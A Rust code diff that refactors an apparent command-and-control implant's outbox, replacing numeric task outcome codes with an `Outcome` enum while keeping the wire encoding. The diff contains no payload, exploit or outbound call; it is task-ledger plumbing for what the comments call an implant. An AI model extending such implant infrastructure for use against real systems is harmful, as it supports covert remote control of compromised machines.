@@ -2,6 +2,7 @@ use std::collections::{HashMap, VecDeque};
 
 use prost::Message;
 
+use crate::handlers::Outcome;
 use crate::wire::{Frame, FrameKind, StagedPull, TaskAck, TaskRequest, TaskResult};
 
 /// The upstream batch and the task ledger: one owner for everything the
@@ -19,7 +20,7 @@ pub struct Outbox {
     queue: VecDeque<Frame>,
     /// Completed tasks by id: (wire outcome, output). A held entry answers
     /// any redelivery from the cache.
-    ledger: HashMap<String, (i32, String)>,
+    ledger: HashMap<String, (Outcome, String)>,
     /// Staged tasks awaiting their payload, keyed by id: the original
     /// request is kept whole (verb and arguments ride the staged grammar),
     /// and the demand order is the map's insertion order via `demands`.
@@ -32,12 +33,16 @@ impl Outbox {
         self.queue.push_back(frame);
     }
 
-    pub fn result(&mut self, task_id: &str, outcome: i32, output: &str) {
+    /// Records a task's outcome and queues its TaskResult. The wire's
+    /// numeric outcome codes live behind this boundary -- the rest of the
+    /// implant speaks `Outcome`.
+    pub fn result(&mut self, task_id: &str, outcome: Outcome, output: &str) {
         self.ledger.insert(task_id.to_string(), (outcome, output.to_string()));
+        let wire = if outcome == Outcome::Succeeded { 1 } else { 2 };
         self.queue.push_back(Frame {
             payload: TaskResult {
                 task_id: task_id.to_string(),
-                outcome,
+                outcome: wire,
                 output: output.to_string(),
             }
             .encode_to_vec(),
@@ -63,7 +68,7 @@ impl Outbox {
         self.ledger.contains_key(task_id)
     }
 
-    pub fn cached(&self, task_id: &str) -> Option<(i32, String)> {
+    pub fn cached(&self, task_id: &str) -> Option<(Outcome, String)> {
         self.ledger.get(task_id).cloned()
     }
 
